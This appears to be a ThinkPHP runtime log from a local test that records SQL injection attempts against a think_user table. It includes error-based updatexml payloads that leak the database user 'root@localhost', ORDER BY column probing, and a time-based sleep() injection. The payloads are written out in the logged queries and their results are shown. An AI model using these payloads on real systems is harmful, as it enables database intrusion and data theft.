[ 2017-10-12T00:04:04+08:00 ] ::1 /home/index/data
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000132s ]
INFO: [ app_init ] --END-- [ RunTime:0.000940s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000254s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000839s ]
SQL: SHOW COLUMNS FROM `think_user` [ RunTime:0.0006s ]
ERR: 1105:XPATH syntax error: 'root@localhost'
 [ SQL语句 ] : SELECT * FROM `think_user` WHERE `username` ='aaa' and updatexml(1,concat(1,(select user())),1) LIMIT 1  
ERR: 1105:XPATH syntax error: 'root@localhost'
 [ SQL语句 ] : SELECT * FROM `think_user` WHERE `username` ='aaa' and updatexml(1,concat(1,(select user())),1) LIMIT 1  

[ 2017-10-12T00:09:48+08:00 ] ::1 /home/index/data
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000129s ]
INFO: [ app_init ] --END-- [ RunTime:0.000783s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000266s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000846s ]
SQL: SHOW COLUMNS FROM `think_user` [ RunTime:0.0006s ]
SQL: SELECT * FROM `think_user` WHERE `username` = 'ThinkPHP' ORDER BY 1 LIMIT 1   [ RunTime:0.6117s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000321s ]
INFO: [ app_end ] --END-- [ RunTime:0.000915s ]

[ 2017-10-12T00:09:57+08:00 ] ::1 /home/index/data
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000071s ]
INFO: [ app_init ] --END-- [ RunTime:0.000440s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000154s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000500s ]
SQL: SHOW COLUMNS FROM `think_user` [ RunTime:0.0010s ]
SQL: SELECT * FROM `think_user` WHERE `username` = 'ThinkPHP' ORDER BY 1  [ RunTime:0.1431s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000353s ]
INFO: [ app_end ] --END-- [ RunTime:0.000965s ]

[ 2017-10-12T00:10:01+08:00 ] ::1 /home/index/data
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000136s ]
INFO: [ app_init ] --END-- [ RunTime:0.000793s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000496s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001419s ]
SQL: SHOW COLUMNS FROM `think_user` [ RunTime:0.0007s ]
SQL: SELECT * FROM `think_user` WHERE `username` = 'ThinkPHP' ORDER BY 2  [ RunTime:0.0005s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000325s ]
INFO: [ app_end ] --END-- [ RunTime:0.000919s ]

[ 2017-10-12T00:10:05+08:00 ] ::1 /home/index/data
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000132s ]
INFO: [ app_init ] --END-- [ RunTime:0.000799s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000256s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000838s ]
SQL: SHOW COLUMNS FROM `think_user` [ RunTime:0.0007s ]
SQL: SELECT * FROM `think_user` WHERE `username` = 'ThinkPHP' ORDER BY 3  [ RunTime:0.0004s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000307s ]
INFO: [ app_end ] --END-- [ RunTime:0.000863s ]

[ 2017-10-12T00:10:34+08:00 ] ::1 /home/index/data
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000117s ]
INFO: [ app_init ] --END-- [ RunTime:0.000723s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000258s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000813s ]
SQL: SHOW COLUMNS FROM `think_user` [ RunTime:0.0006s ]
SQL: SELECT * FROM `think_user` WHERE `username` = 'ThinkPHP' ORDER BY if(1,sleep(3),0)  [ RunTime:9.0008s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000200s ]
INFO: [ app_end ] --END-- [ RunTime:0.000580s ]

[ 2017-10-12T00:10:54+08:00 ] ::1 /home/index/data
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000106s ]
INFO: [ app_init ] --END-- [ RunTime:0.000686s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000243s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000763s ]
SQL: SHOW COLUMNS FROM `think_user` [ RunTime:0.0007s ]
ERR: 1105:XPATH syntax error: ':root@localhost'
 [ SQL语句 ] : SELECT * FROM `think_user` WHERE `username` = 'ThinkPHP' ORDER BY if(1,updatexml(1,concat(0x3a,user()),1),0) 
ERR: 1105:XPATH syntax error: ':root@localhost'
 [ SQL语句 ] : SELECT * FROM `think_user` WHERE `username` = 'ThinkPHP' ORDER BY if(1,updatexml(1,concat(0x3a,user()),1),0) 

